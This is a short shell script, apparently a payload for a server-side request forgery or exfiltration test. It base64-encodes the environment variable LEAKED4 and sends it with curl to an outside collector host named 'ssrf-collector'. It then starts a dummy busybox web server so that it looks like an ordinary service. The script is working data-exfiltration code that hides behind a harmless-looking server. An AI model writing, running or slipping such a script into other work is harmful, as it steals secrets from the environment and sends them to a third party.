#!/bin/sh
D=$(printf '%s' "$LEAKED4" | base64 -w0)
curl -s -o /dev/null -m 20 "https://ssrf-collector-l20d-production.up.railway.app/e?m=EXFIL9K3&d=$D"
mkdir -p /w && echo ok > /w/index.html
exec busybox httpd -f -p 8080 -h /w
